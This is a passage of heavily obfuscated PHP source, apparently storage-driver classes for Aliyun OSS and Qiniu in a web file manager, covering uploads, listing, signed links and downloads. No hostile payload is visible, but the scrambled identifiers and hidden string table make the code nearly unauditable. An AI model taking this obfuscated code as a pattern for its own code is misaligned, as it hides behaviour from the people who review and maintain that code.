array_merge(array($Á¨°ë ·[4]), $ªª«³¢ğ[$Šè­§îÉ[1429]]); sort($³Ğº®Û¾); $Á¨°ë ·[4] = implode($Šè­§îÉ[19], $³Ğº®Û¾); } $°´œá = implode($Šè­§îÉ[19], $Á¨°ë ·); $óç¦˜ÌÚ = base64_encode(hash_hmac($Šè­§îÉ[242], $°´œá, $this->secret, !0)); $ûĞÇ²º = $Šè­§îÉ[1393] . $this->accessKey . $Šè­§îÉ[4] . $óç¦˜ÌÚ; if (strpos($÷Ùìö”û, $Šè­§îÉ[238]) === 0) { $ûĞÇ²º = array($Šè­§îÉ[244] => $ûĞÇ²º, $Šè­§îÉ[235] => $ñÓş¾ù); if ($íã³úÙ¿) { $ûĞÇ²º = array_merge($ûĞÇ²º, $íã³úÙ¿); } } return $ûĞÇ²º; } public function listUploadParts($üŸ—‹ôŠ, $ôÖäöº¬) { $ÏªøÀÂš =& $_SERVER[Å¶¨Şêº]; $™¢°¢†ß = parse_url_query($ôÖäöº¬[$ÏªøÀÂš[185]]); $ãÂ™å¯ = $this->client->listParts($this->bucket, $this->pathEncode($üŸ—‹ôŠ), $™¢°¢†ß[$ÏªøÀÂš[234]]); $ƒ†±±ª© = $ãÂ™å¯->getListPart(); $¸Ìü‰ùÑ = array(); foreach ($ƒ†±±ª© as $©Ù”˜Òô) { $¸Ìü‰ùÑ[] = array($ÏªøÀÂš[1413] => $©Ù”˜Òô->getPartNumber(), $ÏªøÀÂš[1414] => trim($©Ù”˜Òô->getETag(), $ÏªøÀÂš[129])); } unset($ôÖäöº¬[$ÏªøÀÂš[236]], $ôÖäöº¬[$ÏªøÀÂš[240]]); $©í·ƒÁŠ = $this->multiUploadAuthData($üŸ—‹ôŠ, $ôÖäöº¬); if (empty($©í·ƒÁŠ)) { return !1; } return array($ÏªøÀÂš[244] => $©í·ƒÁŠ, $ÏªøÀÂš[235] => $ôÖäöº¬[$ÏªøÀÂš[235]], $ÏªøÀÂš[246] => $¸Ìü‰ùÑ); } public function download($êî”óúã, $Ÿ™ÕèûØ) { if ($this->isFolder($êî”óúã)) { return !1; } try { $Ğ“‘ŠÛ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ÿ™ÕèûØ); $Ğ“‘ŠÛ = $this->trafficLimit($_SERVER[Å¶¨Şêº][120], $Ğ“‘ŠÛ); $this->client->getObject($this->bucket, $this->pathEncode($êî”óúã), $Ğ“‘ŠÛ); } catch (OSS\Core\OssException $ôß¬¹•Ò) { return !1; } return $Ÿ™ÕèûØ; } public function fileSubstr($ÁéÉÕ‡‘, $‰´†İÉ = 0, $Ô·¯ÏŠ = false) { if ($‰´†İÉ === -1) { $ğÇÆ´Ëµ = array(); } else { if ($Ô·¯ÏŠ === !1) { $®Ùˆ¤ş… = $this->size($ÁéÉÕ‡‘); } else { $®Ùˆ¤ş… = $‰´†İÉ + $Ô·¯ÏŠ - 1; } $ğÇÆ´Ëµ = array(OSS\OssClient::OSS_RANGE => "{$‰´†İÉ}\55{$®Ùˆ¤ş…}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÁéÉÕ‡‘), $ğÇÆ´Ëµ); } catch (OSS\Core\OssException $îÊ½ÈÒ¸) { think_exception($îÊ½ÈÒ¸->getMessage()); return !1; } } private function trafficLimit($§Â’ô˜ˆ, $Ïƒş²µ = array()) { $™õ¦ÑóÂ =& $_SERVER[Å¶¨Şêº]; if ($§Â’ô˜ˆ == $™õ¦ÑóÂ[1419] && $this->isUploadServer() || $§Â’ô˜ˆ == $™õ¦ÑóÂ[120] && $this->isFileOutServer()) { return $Ïƒş²µ; } $Ò¯Ñ‰øŠ = floatval($GLOBALS[$™õ¦ÑóÂ[6]][$™õ¦ÑóÂ[100]][$™õ¦ÑóÂ[118]][$§Â’ô˜ˆ]) * 1024 * 1024 * 8; if (!$Ò¯Ñ‰øŠ) { return $Ïƒş²µ; } $Ò¯Ñ‰øŠ = $Ò¯Ñ‰øŠ < 819200 ? 819200 : ($Ò¯Ñ‰øŠ > 838860800 ? 838860800 : $Ò¯Ñ‰øŠ); $Ïƒş²µ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ò¯Ñ‰øŠ); return $Ïƒş²µ; } public function link($·¥ıí³, $çıÖ¼ñé = array()) { $¡üæşˆ =& $_SERVER[Å¶¨Şêº]; if (!$this->exist($·¥ıí³) || $this->isFolder($·¥ıí³)) { return !1; } try { $çıÖ¼ñé = $this->trafficLimit($¡üæşˆ[120], $çıÖ¼ñé); $¨ÌŸ£‰¿ = $this->client->signUrl($this->bucket, $this->pathEncode($·¥ıí³), 3600 * 12, $¡üæşˆ[241], $çıÖ¼ñé); return $this->getCdnLink($¨ÌŸ£‰¿); } catch (OSS\Core\OssException $ß†Õëö±) { return !1; } } public function fileOut($Öêí‰ ›, $íËª‘ÏÓ = false, $—åÍ±Ò = false, $¹èØØ‡ = '') { $±ÑÄÚ• =& $_SERVER[Å¶¨Şêº]; if ($this->isFileOutServer()) { return $this->fileOutServer($Öêí‰ ›, $íËª‘ÏÓ, $—åÍ±Ò, $¹èØØ‡); } if (!$—åÍ±Ò) { $—åÍ±Ò = $this->pathThis($Öêí‰ ›); } $—åÍ±Ò = rawurlencode($—åÍ±Ò); $¤ğÚõãĞ = get_file_mime(get_path_ext($—åÍ±Ò)); if ($¤ğÚõãĞ == $±ÑÄÚ•[228]) { return parent::fileOut($Öêí‰ ›, $íËª‘ÏÓ, $—åÍ±Ò, $¹èØØ‡); } $íËª‘ÏÓ = $íËª‘ÏÓ ? $±ÑÄÚ•[1430] : $±ÑÄÚ•[1431]; $Û‹à·ÕÍ = array(OSS\OssClient::OSS_SUB_RESOURCE => $±ÑÄÚ•[1432] . rawurlencode("{$íËª‘ÏÓ}\x3b\x66\151\x6c\x65\x6e\x61\155\145\x3d{$—åÍ±Ò}")); $Û‹à·ÕÍ[OSS\OssClient::OSS_SUB_RESOURCE] .= $±ÑÄÚ•[1433] . rawurlencode($¤ğÚõãĞ); $ÖÅ¤È÷Â = $this->link($Öêí‰ ›, $Û‹à·ÕÍ); $this->fileOutLink($ÖÅ¤È÷Â); } public function fileOutServer($Ûİ»ßŸÏ, $Ô‘ïÏû = false, $ÆêÙŞÅ… = false, $»ÒŸ¸†ù = '') { parent::fileOut($Ûİ»ßŸÏ, $Ô‘ïÏû, $ÆêÙŞÅ…, $»ÒŸ¸†ù); } public function fileOutImage($…È©Èö, $‚ó „õá = 250) { $õ¿İ‘ÜÉ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Å¶¨Şêº][1434] . $‚ó „õá); $òÅ¦ä˜ = $this->link($…È©Èö, $õ¿İ‘ÜÉ); $this->fileOutLink($òÅ¦ä˜); } public function fileOutImageServer($Ø§¿“åš, $šõÔß¥ = 250) { parent::fileOutImage($Ø§¿“åš, $šõÔß¥); } public function fileOutLink($¸ÕğÇã) { $êÑÓ¸Çİ =& $_SERVER[Å¶¨Şêº]; if (!$this->isCdnHost() && substr($¸ÕğÇã, 0, 7) == $êÑÓ¸Çİ[1335]) { $¸ÕğÇã = $êÑÓ¸Çİ[1336] . substr($¸ÕğÇã, 7); } header($êÑÓ¸Çİ[172] . $¸ÕğÇã); die; } public function hashMd5($•ëÜõÛó, $““Úçò¥ = '') { $ÑâØ¶Ç =& $_SERVER[Å¶¨Şêº]; $â¡ÕÍ´ = $this->_objectMeta($•ëÜõÛó); if (!$â¡ÕÍ´) { return $ÑâØ¶Ç[12]; } if (!isset($â¡ÕÍ´[$ÑâØ¶Ç[1409]]) && !empty($““Úçò¥)) { $ë¸ÄØÑ = $this->updateObjMeta($•ëÜõÛó, array($ÑâØ¶Ç[1409] => $““Úçò¥)); $â¡ÕÍ´[$ÑâØ¶Ç[1409]] = $ë¸ÄØÑ ? $““Úçò¥ : $ÑâØ¶Ç[12]; } return isset($â¡ÕÍ´[$ÑâØ¶Ç[1409]]) ? strtolower($â¡ÕÍ´[$ÑâØ¶Ç[1409]]) : $ÑâØ¶Ç[12]; } public function size($±…¥ìœÊ) { $í¸ÎÇ² = $this->objectMeta($±…¥ìœÊ); return $í¸ÎÇ² ? $í¸ÎÇ²[$_SERVER[Å¶¨Şêº][87]] : 0; } public function info($®¥¤£„è) { if ($this->isFolder($®¥¤£„è)) { return $this->folderInfo($®¥¤£„è); } else { if ($this->isFile($®¥¤£„è)) { return $this->fileInfo($®¥¤£„è); } } return !1; } public function exist($“ÎÑòÅ£) { return $this->isFile($“ÎÑòÅ£) || $this->isFolder($“ÎÑòÅ£); } public function isFile($øÖ±şøŠ) { return !$this->isFolder($øÖ±şøŠ) && $this->objectMeta($øÖ±şøŠ); } public function isFolder($ ™¼Ø¢) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][176], $ ™¼Ø¢); } protected function objectMeta($İ«¾‡Ó) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][178], $İ«¾‡Ó); } protected function _objectMeta($³·í†¶€) { $¥˜“ÓÏ =& $_SERVER[Å¶¨Şêº]; try { $ÔÏ‘ÀÖş = $this->client->getObjectMeta($this->bucket, $this->pathEncode($³·í†¶€)); } catch (OSS\Core\OssException $Ç–´Şë²) { $ÔÏ‘ÀÖş = !1; } if ($ÔÏ‘ÀÖş) { $ÔÏ‘ÀÖş[$¥˜“ÓÏ[87]] = intval($ÔÏ‘ÀÖş[$¥˜“ÓÏ[1407]]); } return $ÔÏ‘ÀÖş; } protected function _isFolder($äš±Å‚ö) { $ıÅ ™ =& $_SERVER[Å¶¨Şêº]; if ($äš±Å‚ö == $ıÅ ™[12] || $äš±Å‚ö == $ıÅ ™[8]) { return !0; } $ŞòÀÅ¼É = array($ıÅ ™[1403] => $ıÅ ™[8], $ıÅ ™[1404] => rtrim($äš±Å‚ö, $ıÅ ™[8]) . $ıÅ ™[8], $ıÅ ™[1405] => 1, $ıÅ ™[1406] => $ıÅ ™[12]); $ÊÁßÄ° = $this->client->listObjects($this->bucket, $ŞòÀÅ¼É); if ($ÊÁßÄ°->getObjectList() || $ÊÁßÄ°->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ªèÉ“ˆß) { parent::__construct(); require_once SDK_DIR . $_SERVER[Å¶¨Şêº][1435]; $this->_init($ªèÉ“ˆß); } public function _init($ÇÔæËöÁ) { $Š³Ù®ƒç =& $_SERVER[Å¶¨Şêº]; $this->config = $ÇÔæËöÁ; foreach ($ÇÔæËöÁ as $Õ— £Äœ => $•îÊ™Ñà) { if (isset($this->{$Õ— £Äœ})) { $this->{$Õ— £Äœ} = $•îÊ™Ñà; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Š³Ù®ƒç[1436] . LNG($Š³Ù®ƒç[1394])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($†‹¥€Ôî, $ø”§­Ÿî = '', $Æøí±Ú = REPEAT_RENAME) { if ($this->setContent($†‹¥€Ôî, $ø”§­Ÿî)) { return $this->getPathOuter($†‹¥€Ôî); } return !1; } public function mkdir($ÇÓÇŞ¥ß, $½Œôá÷ = REPEAT_SKIP) { $—Ş¡°û¦ =& $_SERVER[Å¶¨Şêº]; $µàšïÜ– = trim($ÇÓÇŞ¥ß, $—Ş¡°û¦[8]); if ($this->_isFolder($µàšïÜ–)) { return $this->getPathOuter($µàšïÜ–); } $ÇÓÇŞ¥ß = $µàšïÜ– . $—Ş¡°û¦[8]; $ŠûÒİÛ„ = get_path_this($µàšïÜ–); $Óæ‘ÏÛõ = $ÇÓÇŞ¥ß . $ŠûÒİÛ„; if (!$this->mkfile($Óæ‘ÏÛõ)) { return !1; } if (!$this->moveFile($Óæ‘ÏÛõ, $ÇÓÇŞ¥ß)) { $this->delFile($Óæ‘ÏÛõ); return !1; } return $this->getPathOuter($µàšïÜ–); } public function copyFile($«šˆî²Ñ, $©ïÄç×Ó) { $ÈúˆÕŸÙ = $this->bucketManager->copy($this->bucket, $«šˆî²Ñ, $this->bucket, $©ïÄç×Ó, !0); return $ÈúˆÕŸÙ ? !1 : $this->getPathOuter($©ïÄç×Ó); } public function moveFile($ë§±îßë, $‰íò•¸) { $§ÚØôâæ = $this->bucketManager->move($this->bucket, $ë§±îßë, $this->bucket, $‰íò•¸, !0); return $§ÚØôâæ ? !1 : $this->getPathOuter($‰íò•¸); } public function delFile($–à­šŠ) { if (!$this->exist($–à­šŠ)) { return !0; } $ƒ½¶ ñş = $this->bucketManager->delete($this->bucket, $–à­šŠ); return $ƒ½¶ ñş ? !1 : !0; } public function delFolder($¬Î”ƒæÄ) { $¯ˆ‘¤ó =& $_SERVER[Å¶¨Şêº]; if (!$this->exist($¬Î”ƒæÄ)) { return !0; } $this->listItemCache = !1; $üÊ„®ôĞ = $this->fileList($¬Î”ƒæÄ); $this->listItemCache = !0; $éŸÜò«† = trim($¬Î”ƒæÄ, $¯ˆ‘¤ó[8]) . $¯ˆ‘¤ó[8]; if (!empty($¬Î”ƒæÄ) && $¬Î”ƒæÄ !== $¯ˆ‘¤ó[209] && !in_array($éŸÜò«†, $üÊ„®ôĞ[$¯ˆ‘¤ó[93]])) { $üÊ„®ôĞ[$¯ˆ‘¤ó[93]][] = $éŸÜò«†; } $“Õ™ĞÃ¹ = $this->delByBatch($üÊ„®ôĞ[$¯ˆ‘¤ó[94]]); if (!$“Õ™ĞÃ¹) { return !1; } $“Õ™ĞÃ¹ = $this->delByBatch($üÊ„®ôĞ[$¯ˆ‘¤ó[93]]); if (!$“Õ™ĞÃ¹) { return !1; } return $this->delFile($éŸÜò«†); } private function delByBatch($¼³®ƒØã) { foreach (array_chunk($¼³®ƒØã, 1000) as $Ëáú®İ) { $–„¨®Ÿ¸ = $this->bucketManager->buildBatchDelete($this->bucket, $Ëáú®İ); list($’šñÎÉá, $Åâõñ¡) = $this->bucketManager->batch($–„¨®Ÿ¸); if ($Åâõñ¡) { return !1; } } return !0; } public function rename($Ü ôá˜¸, $ç£Ôƒ‰‡) { return $this->renameObject($Ü ôá˜¸, $ç£Ôƒ‰‡); } public function fileInfo($–àÄ¥¼Ö, $ÉÔ¹‚…› = false, $¤¼¶ » = array()) { $Ï«ˆì‚µ =& $_SERVER[Å¶¨Şêº]; $é—ğ°â³ = array($Ï«ˆì‚µ[42] => $this->pathThis($–àÄ¥¼Ö), $Ï«ˆì‚µ[95] => $this->getPathOuter($Ï«ˆì‚µ[8] . $–àÄ¥¼Ö), $Ï«ˆì‚µ[43] => $Ï«ˆì‚µ[211], $Ï«ˆì‚µ[87] => isset($¤¼¶ »[$Ï«ˆì‚µ[1437]]) ? $¤¼¶ »[$Ï«ˆì‚µ[1437]] : 0, $Ï«ˆì‚µ[185] => $this->ext($–àÄ¥¼Ö)); if ($ÉÔ¹‚…›) { return $é—ğ°â³; } $é—ğ°â³[$Ï«ˆì‚µ[212]] = $é—ğ°â³[$Ï«ˆì‚µ[96]] = 0; $é—ğ°â³[$Ï«ˆì‚µ[213]] = $é—ğ°â³[$Ï«ˆì‚µ[214]] = !0; if (empty($¤¼¶ »)) { $¤¼¶ » = $this->objectMeta($–àÄ¥¼Ö); if (!$¤¼¶ ») { return $é—ğ°â³; } } if (isset($¤¼¶ »[$Ï«ˆì‚µ[1438]])) { $é—ğ°â³[$Ï«ˆì‚µ[96]] = substr($¤¼¶ »[$Ï«ˆì‚µ[1438]] . $Ï«ˆì‚µ[12], 0, 10); } if (isset($¤¼¶ »[$Ï«ˆì‚µ[1437]])) { $é—ğ°â³[$Ï«ˆì‚µ[87]] = $¤¼¶ »[$Ï«ˆì‚µ[1437]]; } return $é—ğ°â³; } public function folderInfo($ƒîÈ˜à , $µ³ô¢Ó = false) { $ù©Š›¥÷ =& $_SERVER[Å¶¨Şêº]; $†ı•Ì£ˆ = array($ù©Š›¥÷[42] => $this->pathThis($ƒîÈ˜à ), $ù©Š›¥÷[95] => $this->getPathOuter($ù©Š›¥÷[8] . $ƒîÈ˜à ), $ù©Š›¥÷[43] => $ù©Š›¥÷[86]); if ($µ³ô¢Ó) { return $†ı•Ì£ˆ; } $†ı•Ì£ˆ[$ù©Š›¥÷[212]] = $†ı•Ì£ˆ[$ù©Š›¥÷[96]] = 0; $†ı•Ì£ˆ[$ù©Š›¥÷[213]] = $†ı•Ì£ˆ[$ù©Š›¥÷[214]] = !0; $ƒîÈ˜à  = rtrim($ƒîÈ˜à , $ù©Š›¥÷[8]) . $ù©Š›¥÷[8]; $‚¯ñêÅÃ = $this->objectMeta($ƒîÈ˜à ); if (isset($‚¯ñêÅÃ[$ù©Š›¥÷[1438]])) { $†ı•Ì£ˆ[$ù©Š›¥÷[96]] = substr($‚¯ñêÅÃ[$ù©Š›¥÷[1438]] . $ù©Š›¥÷[12], 0, 10); } return $†ı•Ì£ˆ; } public function listPath($¿ÎĞšù¤, $éÈÏÁÒ = false) { $Â˜‰ß¤Ø =& $_SERVER[Å¶¨Şêº]; $´šÂÙÁ¸ = $this->fileList($¿ÎĞšù¤, $Â˜‰ß¤Ø[8], !0); foreach ($´šÂÙÁ¸[$Â˜‰ß¤Ø[93]] as $ ÅüÚŠ¿ => $ÒÆ…ûÌŸ) { $´šÂÙÁ¸[$Â˜‰ß¤Ø[93]][$ ÅüÚŠ¿] = $this->folderInfo($ÒÆ…ûÌŸ, $éÈÏÁÒ); } foreach ($´šÂÙÁ¸[$Â˜‰ß¤Ø[94]] as $ ÅüÚŠ¿ => $ÒÆ…ûÌŸ) { $´šÂÙÁ¸[$Â˜‰ß¤Ø[94]][$ ÅüÚŠ¿] = $this->fileInfo($ÒÆ…ûÌŸ[$Â˜‰ß¤Ø[105]], $éÈÏÁÒ, $ÒÆ…ûÌŸ); } return $´šÂÙÁ¸; } public function has($ˆ­êĞ·, $ÎËË¸Š± = false, $ú‰îçª = true) { $î›â­¯ =& $_SERVER[Å¶¨Şêº]; $ˆ­êĞ· = trim($ˆ­êĞ·, $î›â­¯[8]); $Öç€ÆÄò = empty($ˆ­êĞ·) && $ˆ­êĞ· !== $î›â­¯[209] ? $î›â­¯[12] : $ˆ­êĞ· . $î›â­¯[8]; $³·˜ÌÏ = $î›â­¯[12]; $àí•¤äù = 500; $şí©ÆĞ = $î›â­¯[8]; $§íÒà®ô = $‡İÏƒ» = 0; while (!0) { check_abort(); list($ÆöÙ…™³, $šĞÊ€²) = $this->bucketManager->listFiles($this->bucket, $Öç€ÆÄò, $³·˜ÌÏ, $àí•¤äù, $şí©ÆĞ); if ($šĞÊ€²) { break; } $³·˜ÌÏ = array_key_exists($î›â­¯[1406], $ÆöÙ…™³) ? $³·˜ÌÏ = $ÆöÙ…™³[$î›â­¯[1439]] : $î›â­¯[12]; if ($ÎËË¸Š±) { if (!empty($ÆöÙ…™³[$î›â­¯[1440]])) { $§íÒà®ô += count($ÆöÙ…™³[$î›â­¯[1440]]); } if (!empty($ÆöÙ…™³[$î›â­¯[1441]])) { $‡İÏƒ» += count($ÆöÙ…™³[$î›â­¯[1441]]); } if ($³·˜ÌÏ === $î›â­¯[12]) { break; } continue; } if ($ú‰îçª) { if (!empty($ÆöÙ…™³[$î›â­¯[1440]])) { return !0; } } else { if (!empty($ÆöÙ…™³[$î›â­¯[1441]])) { return !0; } } if ($³·˜ÌÏ === $î›â­¯[12]) { break; } } if ($ÎËË¸Š±) { return array($î›â­¯[218] => $§íÒà®ô, $î›â­¯[219] => $‡İÏƒ»); } return !1; } public function listAll($´¥×‰ÅÕ) { $å¢ÄÖ›¯ =& $_SERVER[Å¶¨Şêº]; $õµ‡ = $this->fileList($´¥×‰ÅÕ, $å¢ÄÖ›¯[12], !0); $„îÆ€åô = array_to_keyvalue($õµ‡[$å¢ÄÖ›¯[94]], $å¢ÄÖ›¯[42]); foreach ($õµ‡[$å¢ÄÖ›¯[93]] as $”©—ŸŞ’) { if (is_string($”©—ŸŞ’)) { $„îÆ€åô[$”©—ŸŞ’] = array($å¢ÄÖ›¯[87] => 0); } } return $this->listAllFiles($´¥×‰ÅÕ, $„îÆ€åô); } private function fileList($üœ¬–€–, $Ñüçæ³© = '', $úöÌ½×Å = 0) { $œ ¾ì« =& $_SERVER[Å¶¨Şêº]; $üœ¬–€– = trim($üœ¬–€–, $œ ¾ì«[8]); $­²êÚÔ = empty($üœ¬–€–) && $üœ¬–€– !== $œ ¾ì«[209] ? $œ ¾ì«[12] : $üœ¬–€– . $œ ¾ì«[8]; $Ó¯Æâ•  = $œ ¾ì«[12]; $ë­ÓÏ = 1000; $°¦“Şâ‘ = $”µéù³ = array(); while (!0) { check_abort(); list($Óƒ¼ªÍŠ, $Ç˜Õü‡) = $this->bucketManager->listFiles($this->bucket, $­²êÚÔ, $Ó¯Æâ• , $ë­ÓÏ, $Ñüçæ³©); if ($Ç˜Õü‡) { break; } $Ó¯Æâ•  = array_key_exists($œ ¾ì«[1406], $Óƒ¼ªÍŠ) ? $Ó¯Æâ•  = $Óƒ¼ªÍŠ[$œ ¾ì«[1439]] : $œ ¾ì«[12]; $Íä†ã„‡ = isset($Óƒ¼ªÍŠ[$œ ¾ì«[1440]]) ? $Óƒ¼ªÍŠ[$œ ¾ì«[1440]] : array(); $ß ©ïß = isset($Óƒ¼ªÍŠ[$œ ¾ì«[1441]]) ? $Óƒ¼ªÍŠ[$œ ¾ì«[1441]] : array(); foreach ($Íä†ã„‡ as $öñîÙÕñ) { if ($öñîÙÕñ[$œ ¾ì«[105]] == $­²êÚÔ) { continue; } $šˆ¡…¦Á = $öñîÙÕñ[$œ ¾ì«[105]]; $ğ¼ŒúÙ­ = $öñîÙÕñ[$œ ¾ì«[1437]]; $öñîÙÕñ[$œ ¾ì«[87]] = $ğ¼ŒúÙ­; $è»Ğ±Å’ = $ğ¼ŒúÙ­ == 0 && substr($šˆ¡…¦Á, strlen($šˆ¡…¦Á) - 1, 1) == $œ ¾ì«[8] ? !0 : !1; $this->cacheMethodInfoSet($šˆ¡…¦Á, $è»Ğ±Å’, $öñîÙÕñ); if ($è»Ğ±Å’) { $°¦“Şâ‘[] = $šˆ¡…¦Á; continue; } $”µéù³[] = $úöÌ½×Å ? $öñîÙÕñ : $šˆ¡…¦Á; } foreach ($ß ©ïß as $šˆ¡…¦Á) { if ($šˆ¡…¦Á == $­²êÚÔ) { continue; } $°¦“Şâ‘[] = $šˆ¡…¦Á; $this->cacheMethodInfoSet($šˆ¡…¦Á, !0); } if ($Ó¯Æâ•  === $œ ¾ì«[12]) { break; } } $this->cacheMethodInfoSet($üœ¬–€–, !0); return array($œ ¾ì«[93] => $°¦“Şâ‘, $œ ¾ì«[94] => $”µéù³); } public function canRead($ŞòÑ­îÁ) { return $this->exist($ŞòÑ­îÁ) ? !0 : !1; } public function canWrite($§Óş¬Ÿ–) { return $this->exist($§Óş¬Ÿ–) ? !0 : !1; } public function getContent($ëÑÚ÷üè) { return $this->fileSubstr($ëÑÚ÷üè, 0, -1); } public function setContent($ ƒ Â§, $ÕÊéƒÆï = '') { $éºš€¿ = $this->tempFile($this->pathThis($ ƒ Â§)); file_put_contents($éºš€¿, $ÕÊéƒÆï); if ($this->upload($ ƒ Â§, $éºš€¿)) { $this->tempFileRemve($éºš€¿); return !0; } return !1; } public function refreshUrls($‹ÂŞåı) { $‚å—œ =& $_SERVER[Å¶¨Şêº]; $Ñ§«’úÄ = array(); if (is_array($‹ÂŞåı)) { foreach ($‹ÂŞåı as $„–âşş) { $Ñ§«’úÄ[] = $this->link($„–âşş); } } else { $Ñ§«’úÄ[] = $this->link($‹ÂŞåı); } $®‚¿À¶— = new Qiniu\Cdn\CdnManager($this->auth); list($ò¨çéÄ›, $ıáôî±ˆ) = $®‚¿À¶—->refreshUrls($Ñ§«’úÄ); if ($ıáôî±ˆ) { return !1; } return $ò¨çéÄ›[$‚å—œ[1179]] == $‚å—œ[757] ? !0 : !1; } public function fileSubstr($‰‘©´Ìµ, $ëşÌ±ã, $®¶äƒ„ã) { $Ş½‹‡ =& $_SERVER[Å¶¨Şêº]; if (!($ØúÂƒ˜Õ = $this->link($‰‘©´Ìµ))) { return !1; } $¾ôíï„é = !1; if ($®¶äƒ„ã > 0) { $“‹¬¼à¹ = $ëşÌ±ã + $®¶äƒ„ã - 1; $¾ôíï„é = array($Ş½‹‡[1442] . $ëşÌ±ã . $Ş½‹‡[395] . $“‹¬¼à¹); } $–İô·‚ = url_request($ØúÂƒ˜Õ, $Ş½‹‡[241], !1, $¾ôíï„é); return $–İô·‚[$Ş½‹‡[747]] ? $–İô·‚[$Ş½‹‡[1200]] : !1; } public function upload($ãÍïìë, $‰´£şØÏ, $ˆæíµ€ = false, $÷¸è·¨ò = REPEAT_REPLACE) { $³†”û÷é = new Qiniu\Storage\UploadManager(); $Ë¶È—ıñ = $this->auth->uploadToken($this->bucket, $ãÍïìë); $Úûü ÷ = get_file_mime(get_path_ext($‰´£şØÏ)); list($–à²ò±, $¥÷É¬Ì—) = $³†”û÷é->putFile($Ë¶È—ıñ, $ãÍïìë, $‰´£şØÏ, null, $Úûü ÷); return $¥÷É¬Ì— ? !1 : $this->getPathOuter($ãÍïìë); } public function uploadFormData($ÜÓñİç, $£şµ·§ã = 3600) { return $this->uploadToken($ÜÓñİç, $£şµ·§ã); } public function multiUploadFormData($ĞÇá·, $û•Éôåã = 3600) { return $this->uploadToken($ĞÇá·, $û•Éôåã); } private function uploadToken($îÁî¢Ì¿, $µÜåÑô = 3600) { $¨ì†çàŞ =& $_SERVER[Å¶¨Şêº]; $£ƒÜ×ø¢ = $µÜåÑô; $Ê“Ï­æ² = array($¨ì†çàŞ[1443] => $¨ì†çàŞ[1444]); $³¾£•• = $îÁî¢Ì¿; $ô™óŸÖ¥ = $this->auth->uploadToken($this->bucket, $³¾£••, $£ƒÜ×ø¢, $Ê“Ï­æ², !0); $ÖË°©Şª = empty($this->region) || $this->region == $¨ì†çàŞ[1445] ? $¨ì†çàŞ[12] : $¨ì†çàŞ[395] . $this->region; $—ó‡ ¾ = http_type() . "\72\x2f\57\165\x70\154\x6f\x61\x64{$ÖË°©Şª}\x2e\161\151\156\x69\x75\x70\x2e\143\x6f\x6d\x2f"; return array($¨ì†çàŞ[1446] => $ô™óŸÖ¥, $¨ì†çàŞ[1447] => $—ó‡ ¾); } public function download($ëÙ‰™½û, $ÌÜÆ—„à) { $¥ÇíåºØ = IO::getPathInner(IO::mkfile($ÌÜÆ—„à)); if (!($…É’¢è… = $this->link($ëÙ‰™½û))) { return !1; } $Œ·ƒ¨½— = 0; $Šœ¹Áæó = 1024 * 200; $¬‚¯¸Ÿ = fopen($¥ÇíåºØ, $_SERVER[Å¶¨Şêº][1448]); while (!0) { $ÇÌ€õû™ = $this->fileSubstr($ëÙ‰™½û, $Œ·ƒ¨½—, $Šœ¹Áæó); if ($ÇÌ€õû™ === !1) { return !1; } fwrite($¬‚¯¸Ÿ, $ÇÌ€õû™); $Œ·ƒ¨½— += $Šœ¹Áæó; if (strlen($ÇÌ€õû™) < $Šœ¹Áæó) { break; } } fclose($¬‚¯¸Ÿ); return $ÌÜÆ—„à; } public function link($ßõ¹•ÑÙ, $£¶éß¨£ = '') { if (!$this->isFile($ßõ¹•ÑÙ)) { return !1; } $«¨ÕÍ©™ = $this->getHost() . $_SERVER[Å¶¨Şêº][8] . $this->pathEncode($ßõ¹•ÑÙ) . $£¶éß¨£; return $this->auth->privateDownloadUrl($«¨ÕÍ©™, 3600 * 12); } public function fileOut($÷ÀÏËì, $°•Í¸¨Á = false, $Ó¢šëô = false, $ò™²”ÅŒ = '') { $Úì²¢ª =& $_SERVER[Å¶¨Şêº]; if ($this->isFileOutServer()) { return $this->fileOutServer($÷ÀÏËì, $°•Í¸¨Á, $Ó¢šëô, $ò™²”ÅŒ); } if (!$Ó¢šëô) { $Ó¢šëô = $this->pathThis($÷ÀÏËì); } $‡é“ŠÇ = $°•Í¸¨Á ? $Úì²¢ª[1449] . rawurlencode($Ó¢šëô) : $Úì²¢ª[12]; $–èóé¢¼ = $this->link($÷ÀÏËì, $‡é“ŠÇ); $this->fileOutLink($–èóé¢¼); } public function fileOutServer($¡–İŞ¨¿, $ù„ÓÕƒ = false, $¬ £„Ìâ = false, $±¨š‹‚ = '') { parent::fileOut($¡–İŞ¨¿, $ù„ÓÕƒ, $¬ £„Ìâ, $±¨š‹‚); } public function fileOutImage($Î¬€ê», $¶ªÙÔˆ = 250) { $ÀšÂ÷—„ = $this->link($Î¬€ê», $_SERVER[Å¶¨Şêº][1450] . $¶ªÙÔˆ); $this->fileOutLink($ÀšÂ÷—„); } public function fileOutImageServer($¿—û«¨ø, $»¯ïãªü = 250) { parent::fileOutImage($¿—û«¨ø, $»¯ïãªü); } public function hashMd5($ãÊ¦ó³Ú) { $Æò•Íæˆ =& $_SERVER[Å¶¨Şêº]; $´¨çÁ‡Ú = $this->objectMeta($ãÊ¦ó³Ú); return isset($´¨çÁ‡Ú[$Æò•Íæˆ[223]]) ? $´¨çÁ‡Ú[$Æò•Íæˆ[223]] : !1; $ÃÇ£õÚì = $this->link($ãÊ¦ó³Ú, $Æò•Íæˆ[1451]); } public function size($½Çè•‰) { $¼ïª‰ùæ = $this->objectMeta($½Çè•‰); return $¼ïª‰ùæ ? $¼ïª‰ùæ[$_SERVER[Å¶¨Şêº][87]] : 0; } public function info($‹¬ÃûÃÆ) { 